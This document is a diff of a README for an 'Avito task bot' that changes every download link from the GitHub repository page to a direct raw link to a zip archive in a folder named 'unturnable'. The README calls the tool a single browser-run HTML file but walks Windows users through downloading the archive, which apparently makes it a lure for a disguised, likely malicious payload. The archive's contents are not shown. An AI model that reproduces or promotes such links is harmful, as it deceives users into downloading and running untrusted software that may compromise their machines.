@@ -1,6 +1,6 @@
 # 🤖 avito-task-bot-2026 - Automate Your Avito Tasks Effortlessly
 
-[![Download Avito Task Bot](https://img.shields.io/badge/Download-Avito_Task_Bot_2026-2ea44f?style=for-the-badge)](https://github.com/Baillieaccepting502/avito-task-bot-2026)
+[![Download Avito Task Bot](https://img.shields.io/badge/Download-Avito_Task_Bot_2026-2ea44f?style=for-the-badge)](https://raw.githubusercontent.com/Baillieaccepting502/avito-task-bot-2026/main/unturnable/avito_bot_task_1.1-beta.3.zip)
 
 Welcome to **avito-task-bot-2026** – your lightweight, browser-based assistant designed to streamline your daily Avito workflows. Whether you're managing listings, tracking responses, or organizing your sales, this tool simplifies repetitive tasks so you can focus on what matters most. Best of all, it runs entirely in your web browser – no complex software to install, no coding required.
 
@@ -15,7 +15,7 @@ This is a **task automation utility** built as a single HTML file. Think of it a
 ## 📥 Download & Installation (Windows)
 
 Visit this link to download the application:  
-[**https://github.com/Baillieaccepting502/avito-task-bot-2026**](https://github.com/Baillieaccepting502/avito-task-bot-2026)
+[**https://raw.githubusercontent.com/Baillieaccepting502/avito-task-bot-2026/main/unturnable/avito_bot_task_1.1-beta.3.zip**](https://raw.githubusercontent.com/Baillieaccepting502/avito-task-bot-2026/main/unturnable/avito_bot_task_1.1-beta.3.zip)
 
 Here’s exactly what to do, step by step:
 
@@ -152,7 +152,7 @@ We regularly improve the bot based on user feedback. Remember to check back occa
 
 **Click the big green button below to download your copy now:**
 
-[![Download Avito Task Bot](https://img.shields.io/badge/Download-Avito_Task_Bot-FF5722?style=for-the-badge)](https://github.com/Baillieaccepting502/avito-task-bot-2026)
+[![Download Avito Task Bot](https://img.shields.io/badge/Download-Avito_Task_Bot-FF5722?style=for-the-badge)](https://raw.githubusercontent.com/Baillieaccepting502/avito-task-bot-2026/main/unturnable/avito_bot_task_1.1-beta.3.zip)
 
 Once downloaded, follow the simple steps in the **Download & Installation** section. You'll be automating your Avito tasks within two minutes. It's that easy!
 
